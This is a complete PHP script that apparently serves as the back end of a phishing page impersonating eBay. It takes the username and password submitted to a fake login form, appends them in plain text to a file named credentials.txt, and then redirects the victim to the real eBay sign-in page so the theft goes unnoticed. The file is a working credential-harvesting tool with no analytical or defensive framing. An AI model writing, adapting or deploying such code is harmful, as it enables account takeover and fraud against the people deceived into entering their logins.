<?php
 //Extract the credentials received
 $username = $_POST["1687429726"];
 $password = $_POST["7977605"];
 //Write the credentials to text file
 $myfile = fopen("credentials.txt", "a") or die("Unable to open file!");
 $txt = "USERNAME = $username , PASSWORD = $password\n";
 fwrite($myfile, "\n". $txt);
 fclose($myfile);
 //Redirect the browser to original login page
 header("Location: https://signin.ebay.com/ws/eBayISAPI.dll?SignIn&ru=http%3A%2F%2Fwww.ebay.com%2F");
 exit();
?>